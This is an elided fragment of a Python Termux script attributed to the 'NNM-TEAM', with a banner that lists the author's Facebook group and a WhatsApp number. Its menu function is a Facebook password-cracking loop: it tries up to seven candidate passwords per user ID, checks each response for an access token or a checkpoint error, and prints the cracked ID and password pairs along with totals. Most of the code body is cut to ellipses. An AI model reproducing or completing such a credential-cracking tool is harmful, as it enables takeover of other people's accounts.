...
logo = """                                          
      ...
      \033[1;97m
       \033[1;97m
\033[1;96m(~)\033[1;97m Author : JAVED_IQBAL
\033[1;96m(~)\033[1;97m Fb Group: nnm command for termux
\033[1;96m(~)\033[1;97m Fb: javed Iqbal sad boy
\033[1;96m(~)\033[1;97m WhatsApp: +923422008140
\033[1;97m------------------NNM-TEAM----------------------------
...
def menu_select():
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;96m[NNM] "+uid+" | "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;96m[NNM] "+uid+" | "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print(" \x1b[1;96m[NNM] "+uid+" | "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;96m[NNM] "+uid+" | "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;96m[NNM] "+uid+" | "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;96m[NNM] "+uid+" | "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;96m[NNM] "+uid+" | "+pass7+"\x1b[1;0m")
	...
	print ("[!] Total NNM cp is download : "+str(len(cps)) + "/"+str(len(oks)))
